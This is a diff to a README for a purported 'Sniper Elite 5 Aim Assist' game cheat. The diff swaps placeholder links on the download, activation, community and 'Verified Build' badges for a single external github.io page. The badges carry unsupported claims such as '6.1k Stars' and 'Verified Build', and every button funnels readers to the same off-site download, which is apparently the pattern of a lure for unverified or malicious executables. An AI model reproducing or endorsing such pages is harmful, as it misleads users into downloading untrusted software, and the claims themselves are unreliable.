@@ -4,6 +4,8 @@ The **Sniper Elite 5 Aim Assist** tool is designed for players who crave razor-s
 
 No more wasted ammo or missed headshots—this assistive module ensures precision without stripping away the satisfaction of skillful sniping.
 
+<img width="1200" height="675" alt="image" src="https://github.com/user-attachments/assets/9857b4aa-91d9-4a88-8d24-660e5a806fbb" />
+
 ---
 
 ## 🔍 Overview
@@ -12,6 +14,7 @@ Sniper Elite 5’s sniping mechanics are challenging, blending bullet physics, w
 
 [!IMPORTANT]
 This tool is intended for **offline single-player use** to enhance immersion and accessibility.
+
 
 ---
 
@@ -27,10 +30,10 @@ This tool is intended for **offline single-player use** to enhance immersion and
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-🔥-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.1k Stars](https://img.shields.io/badge/GitHub-⭐️%206.1k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-🔥-red?style=for-the-badge\&logo=rocket)](https://sniper-elite-5-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://sniper-elite-5-aim-assist.github.io/.github/)
+[![⭐️ 6.1k Stars](https://img.shields.io/badge/GitHub-⭐️%206.1k%20Stars-black?style=for-the-badge\&logo=github)](https://sniper-elite-5-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](https://sniper-elite-5-aim-assist.github.io/.github/)
 
 ---
 
@@ -103,9 +106,9 @@ A: Frequent patches ensure compatibility with the latest game version.
 
 The **Sniper Elite 5 Aim Assist Tool** is the perfect companion for players who want **consistent accuracy and better control** without losing the challenge of realistic ballistics. Whether you’re clearing missions stealthily or going for high-scoring headshots, this tool ensures your shots land exactly where you want them.
 
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?style=for-the-badge\&logo=discord)](#)
-[![Verified Build](https://img.shields.io/badge/Build-Verified-success?style=for-the-badge\&logo=checkmarx)](#)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge\&logo=download)](https://sniper-elite-5-aim-assist.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?style=for-the-badge\&logo=discord)](https://sniper-elite-5-aim-assist.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Build-Verified-success?style=for-the-badge\&logo=checkmarx)](https://sniper-elite-5-aim-assist.github.io/.github/)
 
 ---
 
